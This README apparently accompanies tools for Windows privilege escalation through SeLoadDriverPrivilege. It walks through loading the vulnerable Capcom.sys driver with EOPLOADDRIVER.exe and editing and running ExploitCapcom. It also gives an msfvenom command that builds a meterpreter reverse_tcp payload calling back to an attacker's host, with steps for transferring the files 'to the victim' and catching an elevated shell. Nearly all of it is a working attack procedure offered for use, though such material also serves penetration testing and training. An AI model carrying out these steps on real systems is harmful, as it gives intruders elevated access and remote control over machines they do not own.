# SeLoaddriver Privilege Escalation
The files in here will help you to exploit the SeLoaddriver Privilege on your windows systems to help elevate your privileges.
If you do not have the SeLoaddriver privilege enabled, the file EOPLOADDRIVER.exe will enable it for you. 

For more information on this vulnerability visit https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/

I have included the compiled versions of the files if anyone is having a hard time compiling it themselves.

If you need to get a elevated shell then you might need to create you own payload to be executed. You can use the
code below as an example:

"msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > exploit.exe"

You will need to compile the ExploitCapcom project because you are required to edit it according to what you want the exploit to do. (i.e: If you need it to run a specific command or execute a specific file)

You can open the project using Visualstudio 2017 or 2019 and locate "TCHAR CommandLine[]" in the .cpp file. Replace it what you want it to do. Example: TCHAR CommandLine[] = TEXT("C:\\test\\exploit.exe");

You may use the compiled version but it has the command set to "C:\\tmp\\exploit.exe" where exploit.exe is the payload created above.

Once this has been compiled you will need to transfer all files to the victim. (Capcom.sys, EOPLOADDRIVER.exe, ExploitCapcom.exe, exploit.exe)

Below are the commands you will need to execute afterwards.

.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\test\capcom.sys (replace "C:\test\capcom.sys" with the path to your Capcom.sys file)

If the above succeeds then you may start a listener on your local machine (If a reverseshell payload is used and make sure to place the payload in the relavent directory used).

Finally run:  .\ExploitCapcom.exe

If it was a reverseshell payload used, you may have got a elevated connection back.

The direct repos for the above codes are:

https://github.com/tandasat/ExploitCapcom

https://github.com/TarlogicSecurity/EoPLoadDriver/


